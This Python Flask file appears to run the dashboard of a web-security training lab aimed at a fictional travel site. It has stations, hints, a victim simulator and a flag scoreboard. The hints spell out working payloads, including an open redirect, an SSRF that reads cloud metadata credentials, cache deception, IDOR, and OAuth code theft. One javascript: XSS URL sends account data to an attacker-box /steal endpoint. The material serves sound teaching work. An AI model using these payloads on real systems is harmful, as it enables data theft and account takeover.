"""Lab dashboard (published on :8000): stations, hints, victim simulator, flag scoreboard."""
import os
import sqlite3
import time

import requests
from flask import Flask, Response, redirect, request

import common as c

app = Flask(__name__)
SCORE_DB = os.environ.get("SCORE_DB", "/data/score.db")
BOT = os.environ.get("BOT_URL", "http://bot:7000")

STATION_INFO = {
    "R0": {"day": 1, "port": 8080, "goal":
           "Find an API route that the website's JavaScript knows about but the UI never calls. "
           "Call it with your own account.",
           "hints": ["Open DevTools > Sources (Chrome) or Debugger (Firefox) and read <code>/static/app.js</code>.",
                     "Look at the <code>API</code> object. Which route is not wired to any button?",
                     "Log in with your own account, then open <code>/api/v2/internal/feature-flags</code>. "
                     "Keep the response - it is the candidate list for station A3."]},
    "A1": {"day": 1, "port": 8080, "goal":
           "Build a Fernwood login link that sends a logged-in user to <code>/phish</code> on your attacker box "
           "(port 9000). You are your own victim here: the redirect happens in JavaScript.",
           "hints": ["Read <code>getSafeRedirect()</code> in <code>/static/app.js</code>. "
                     "What does <code>startsWith(\"/\")</code> really allow?",
                     "Browsers read <code>//host/path</code> as 'same scheme, different host'. "
                     "Backslashes are often treated as slashes too.",
                     "Log in, then open <code>http://LAB:8080/login?next=//LAB:9000/phish</code>."]},
    "A2": {"day": 1, "port": 8082, "goal":
           "Make the partner link checker read the cloud credentials at "
           "<code>http://metadata.fernwood.internal/latest/meta-data/iam/security-credentials/</code> "
           "(Fernwood's version of the cloud metadata service).",
           "hints": ["Try the metadata URL directly, then localhost, then <code>http://0x7f000001/</code>. "
                     "Write down every error message - together they are the vendor's security rule.",
                     "Check <code>http://attacker.lab:9000/r?to=http://attacker.lab:9000/hello</code>. "
                     "Look at <code>redirects_followed</code>. Is the second URL checked?",
                     "<code>http://attacker.lab:9000/r?to=http://metadata.fernwood.internal/latest/meta-data/iam/"
                     "security-credentials/linkchecker-role</code>"]},
    "A3": {"day": 1, "port": 8083, "goal":
           "Stretch / instructor demo. Reach an internal-only web application through the partner gateway.",
           "hints": ["Request <code>/partner/v1/status</code>. Read the 502 message as structure, not as status: "
                     "where did the slash go?",
                     "What does a URL parser do with <code>http://a:1@b/</code>? Who is the host?",
                     "Station R0 gave you three internal hostnames. Try each with <code>/partner/@NAME/</code> and "
                     "compare the three different responses."]},
    "B1": {"day": 2, "port": 8080, "goal":
           "Read another member's invoice. Prove it first with TWO accounts you own, then read alice's.",
           "hints": ["Register accounts A and B (two browsers, or one normal + one private window). "
                     "Create a booking with A.",
                     "From B, request A's booking on BOTH API paths (details and invoice). One says 403. "
                     "And try <code>10004</code> instead of a real reference - why does it fail?",
                     "Seeded bookings start at BK-10001. Alice's: <code>/api/v2/bookings/BK-10004/invoice</code>."]},
    "B2": {"day": 2, "port": 8080, "goal":
           "Get alice's profile page served to you without logging in.",
           "hints": ["Logged in, compare <code>/account/profile</code> with <code>/account/profile/x.css</code>. "
                     "Watch the <code>X-Cache-Status</code> response header.",
                     "Control first: with NO cookies (curl or a private window) request a brand-new "
                     "<code>/account/profile/RANDOM.css</code>. What do you get? Then prime a different random name "
                     "with your own account and fetch it again without cookies.",
                     "Choose a NEW random file name, send <code>http://LAB:8080/account/profile/NAME.css</code> to the "
                     "victim simulator, then fetch that exact URL with curl and no cookies."]},
    "C1": {"day": 2, "port": 8080, "goal":
           "Chain: turn Fernwood's language switcher into XSS, read your own account data with JavaScript, "
           "and send it to <code>/steal</code> on your attacker box. You are your own victim (it runs JavaScript).",
           "hints": ["Click <b>العربية</b> in the menu and watch the URL. Then read <code>initLanguageSwitch()</code> "
                     "in <code>/static/app.js</code>. What does it block, and what does it forget?",
                     "First the open redirect: <code>return=//LAB:9000/</code>. Then the chain: a URL that starts with "
                     "<code>javascript:</code> also passes. Try <code>return=javascript:alert(document.domain)</code>.",
                     "Log in, then open: <code>http://LAB:8080/lang?set=ar&amp;return=javascript:fetch('/api/me')"
                     ".then(r=&gt;r.text()).then(t=&gt;location='//LAB:9000/steal?d='.concat(encodeURIComponent(t)))</code>"]},
    "B3": {"day": 2, "port": 8081, "goal":
           "Steal alice's OAuth authorization code and turn it into her access token.",
           "hints": ["Click 'Sign in with Fernwood ID' on the website with DevTools open. Which parameters go to "
                     "<code>/oauth/authorize</code>? Is there a <code>code_challenge</code>? "
                     "Also read <code>/.well-known/openid-configuration</code>.",
                     "Change only the host of <code>redirect_uri</code> to your attacker box. Which part does the "
                     "server actually check? Then POST a made-up code to <code>/oauth/token</code> with "
                     "<code>client_id=fernwood-web</code>: <code>invalid_grant</code> or <code>invalid_client</code>?",
                     "Send alice <code>http://LAB:8081/oauth/authorize?response_type=code&amp;client_id=fernwood-web"
                     "&amp;redirect_uri=http://LAB:9000/callback/TEAM&amp;state=x</code>, read the code at "
                     "<code>http://LAB:9000/_log?q=TEAM</code>, exchange it at <code>/oauth/token</code> with the same "
                     "redirect_uri, then call <code>/userinfo</code> with the token."]},
}


def score_db():
    conn = sqlite3.connect(SCORE_DB, timeout=10, isolation_level=None)
    conn.execute("CREATE TABLE IF NOT EXISTS solves(team TEXT, station TEXT, ts REAL, PRIMARY KEY(team, station))")
    return conn


def lab_host():
    return request.host.rsplit(":", 1)[0]


def nav():
    return [("Stations", "/"), ("Victim simulator", "/victim"), ("Submit flag", "/submit"), ("Scoreboard", "/scoreboard")]


def render(title, body):
    return Response(c.page(title, body, brand="Fernwood Lab", nav=nav()), mimetype="text/html")


@app.after_request
def no_browser_cache(resp):
    # Always show the newest version of these pages (no stale copies in class).
    resp.headers["Cache-Control"] = "no-store"
    return resp


@app.get("/")
def index():
    h = lab_host()
    services = [("Fernwood website", 8080), ("Fernwood ID (OAuth)", 8081), ("Partner link checker", 8082),
                ("Partner API gateway", 8083), ("Your attacker box", 9000)]
    svc = "".join(f"<tr><td>{c.e(n)}</td><td><a href='http://{c.e(h)}:{p}/'>http://{c.e(h)}:{p}/</a></td></tr>"
                  for n, p in services)
    cards = []
    for code, info in STATION_INFO.items():
        hints = "".join(f"<details><summary>Hint {i + 1}</summary><p>{hint.replace('LAB', c.e(h))}</p></details>"
                        for i, hint in enumerate(info["hints"]))
        cards.append(f"<div class=card><h2>{code} &middot; {c.e(c.STATIONS[code])}</h2>"
                     f"<p class=muted>Day {info['day']} &middot; port {info['port']}</p>"
                     f"<p>{info['goal']}</p>{hints}</div>")
    return render("Stations", f"""
      <div class=card><h1>Fernwood Travel - training lab</h1>
      <p><b>Rules:</b> attack only the addresses below. Do not scan or attack the institute network or other
      trainees' laptops. Use fake data when you register. A flag only appears when you reach the
      <i>impact</i>, not when you merely see the bug.</p>
      <table>{svc}</table></div>{''.join(cards)}""")


@app.route("/victim", methods=["GET", "POST"])
def victim():
    msg = ""
    if request.method == "POST":
        try:
            r = requests.post(f"{BOT}/visit", json={"url": request.form.get("url", "")}, timeout=30)
            msg = r.json().get("message", "")
        except Exception as exc:  # noqa: BLE001
            msg = f"Victim simulator unavailable: {exc}"
    return render("Victim simulator", f"""
      <div class=card><h1>Victim simulator</h1>
      <p><b>alice</b> is a logged-in Fernwood member who opens any Fernwood link you send her.
      She follows redirects but does not run JavaScript.</p>
      <p class=warn>On a real program the victim is always <b>your own second account</b> - never a real user.
      Prove everything on your own accounts first.</p>
      <form method=post><label>Link for alice to open</label>
      <input name=url placeholder="http://{c.e(lab_host())}:8080/..." required>
      <p><button>Send to alice</button></p></form>
      <pre>{c.e(msg) or 'No link sent yet.'}</pre></div>""")


@app.route("/submit", methods=["GET", "POST"])
def submit():
    msg = ""
    if request.method == "POST":
        team = request.form.get("team", "").strip()[:30]
        flag = request.form.get("flag", "").strip()
        hit = next((code for code, f in c.FLAGS.items() if f == flag), None)
        if not team:
            msg = "Enter a team name."
        elif not hit:
            msg = "Not a valid flag."
        else:
            conn = score_db()
            conn.execute("INSERT OR IGNORE INTO solves VALUES(?,?,?)", (team, hit, time.time()))
            conn.close()
            msg = f"Correct: {hit} - {c.STATIONS[hit]}. Now fill in the reporting-gate worksheet for it."
    return render("Submit flag", f"""<div class=card><h1>Submit a flag</h1>
      <form method=post><label>Team name</label><input name=team required>
      <label>Flag</label><input name=flag placeholder="FW{{...}}" required>
      <p><button>Submit</button></p></form><p><b>{c.e(msg)}</b></p></div>""")


@app.get("/scoreboard")
def scoreboard():
    conn = score_db()
    rows = conn.execute("SELECT team, COUNT(*), GROUP_CONCAT(station, ' '), MAX(ts) FROM solves "
                        "GROUP BY team ORDER BY COUNT(*) DESC, MAX(ts) ASC").fetchall()
    conn.close()
    trs = "".join(f"<tr><td>{i + 1}</td><td>{c.e(t)}</td><td>{n}</td><td>{c.e(' '.join(sorted(s.split())))}</td></tr>"
                  for i, (t, n, s, _) in enumerate(rows))
    return render("Scoreboard", f"""<div class=card><h1>Scoreboard</h1>
      <table><tr><th>#</th><th>Team</th><th>Solved</th><th>Stations</th></tr>{trs}</table></div>
      <script>setTimeout(function(){{location.reload()}},10000)</script>""")


@app.get("/healthz")
def healthz():
    return "ok"


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
